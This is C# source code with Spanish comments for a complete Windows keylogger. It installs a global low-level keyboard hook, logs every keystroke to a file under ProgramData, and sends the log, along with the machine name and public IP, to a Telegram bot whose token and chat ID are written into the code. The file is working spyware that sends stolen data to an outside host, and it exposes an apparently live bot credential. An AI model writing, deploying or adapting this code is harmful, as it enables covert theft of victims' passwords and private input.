// Importación de librerías necesarias
using System;
using System.Runtime.InteropServices;  // Para trabajar con funciones de la API de Windows
using System.Diagnostics;              // Para manejar procesos y módulos en ejecución
using System.Windows.Forms;            // Para manejar la aplicación y capturar teclas
using System.IO;                       // Para leer y escribir archivos
using System.Net;                      // Para realizar peticiones HTTP (Telegram)
using System.Threading;                // Para ejecutar hilos en paralelo

// Definición del namespace
namespace mykeylogger_telegram
{
    class Program
    {
        // ----------- CONFIGURACIÓN ----------- //
        // Token del bot de Telegram (reemplázalo por el tuyo)
        private const string BOT_TOKEN = "7638164978:AAEOqW1-C-Af10pO-hVUJbJSm1d5wczW-iA";
        // ID del chat de destino (obténlo con getUpdates)
        private const string CHAT_ID = "6031482013";
        // Ruta donde se guarda el log temporal
        private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
        // Ruta donde se guarda una copia antes de enviar por Telegram
        private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
        // Tamaño máximo en bytes antes de enviar log por Telegram
        private const int MAX_LOG_LENGTH_BEFORE_SENDING = 300;
        // Cantidad máxima de teclas antes de guardar en archivo (0 = siempre)
        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
        // -------------------------------------- //

        // Constantes para instalar el hook de teclado
        private static int WH_KEYBOARD_LL = 13;    // Hook de teclado global
        private static int WM_KEYDOWN = 0x0100;    // Mensaje recibido al presionar tecla
        private static IntPtr hook = IntPtr.Zero;  // Referencia al hook instalado
        private static LowLevelKeyboardProc llkProcedure = HookCallback;  // Callback delegado
        private static string buffer = "";         // Buffer temporal de teclas presionadas

        // Función principal
        static void Main(string[] args)
        {
            // Instala el hook de teclado
            hook = SetHook(llkProcedure);
            // Mantiene la aplicación corriendo capturando teclas
            Application.Run();
            // Desinstala el hook al salir
            UnhookWindowsHookEx(hook);
        }

        // Definición del delegado para manejar el callback de teclas
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // Función callback que se ejecuta en cada tecla presionada
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Guarda buffer en archivo si supera la cantidad de teclas configuradas
            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
            {
                StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
                output.Write(buffer);
                output.Close();
                buffer = ""; // Limpia el buffer
            }

            // Verifica tamaño del archivo de log
            FileInfo logFile = new FileInfo(LOG_FILE_NAME);

            // Si el tamaño supera el límite, lo envía por Telegram
            if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING)
            {
                try
                {
                    // Copia archivo de log a copia de respaldo
                    logFile.CopyTo(ARCHIVE_FILE_NAME, true);
                    // Borra archivo original
                    logFile.Delete();

                    // Crea un hilo separado para enviar log a Telegram
                    Thread telegramThread = new Thread(() =>
                    {
                        // Lee contenido del archivo de respaldo
                        string logData = File.ReadAllText(ARCHIVE_FILE_NAME);
                        // Envía log a Telegram
                        sendTelegram(logData);
                    });
                    // Inicia el hilo
                    telegramThread.Start();
                }
                catch (Exception e)
                {
                    Console.Out.WriteLine(e.Message);
                }
            }

            // Si se presionó una tecla y el hook es válido
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                // Obtiene código virtual de la tecla
                int vkCode = Marshal.ReadInt32(lParam);

                // Detecta teclas especiales y las guarda como texto
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");    // Muestra en consola
                    buffer += ".";             // Agrega al buffer
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    buffer += ",";
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    buffer += " ";
                }
                else
                {
                    // Resto de teclas: guarda su nombre
                    Console.Out.Write((Keys)vkCode);
                    buffer += (Keys)vkCode;
                }
            }

            // Pasa evento al siguiente hook en la cadena
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        // Envía mensaje por Telegram usando WebClient
        public static void sendTelegram(string message)
        {
            try
            {
                // Obtiene nombre de la máquina local
                string machineName = Environment.MachineName;
                // Obtiene dirección IP pública
                string ipAddress = GetPublicIP();

                // Construye mensaje final con log, nombre y IP
                string fullMessage = $"[PC: {machineName}] [IP: {ipAddress}]\n{message}";

                // Guarda copia del mensaje enviado para referencia
                File.WriteAllText(@"C:\ProgramData\telegram_message_preview.txt", fullMessage);

                // Codifica mensaje para URL
                string texto = Uri.EscapeDataString(fullMessage);
                // Construye URL de API Telegram
                string url = $"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={texto}";

                // Envía mensaje usando WebClient
                using (WebClient client = new WebClient())
                {
                    string response = client.DownloadString(url);
                    Console.WriteLine("Log enviado a Telegram.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error al enviar a Telegram: " + ex.Message);
            }
        }

        // Obtiene dirección IP pública usando servicio externo
        public static string GetPublicIP()
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    // Consulta API pública para obtener IP
                    string ip = client.DownloadString("https://api.ipify.org");
                    return ip;
                }
            }
            catch
            {
                return "IP no disponible";
            }
        }

        // Instala hook de teclado usando API de Windows
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            string moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        // --------- DLL Imports (API Windows) --------- //

        // Llama al siguiente hook en la cadena
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        // Instala un hook de sistema
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        // Desinstala un hook instalado
        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        // Obtiene handle de un módulo cargado
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}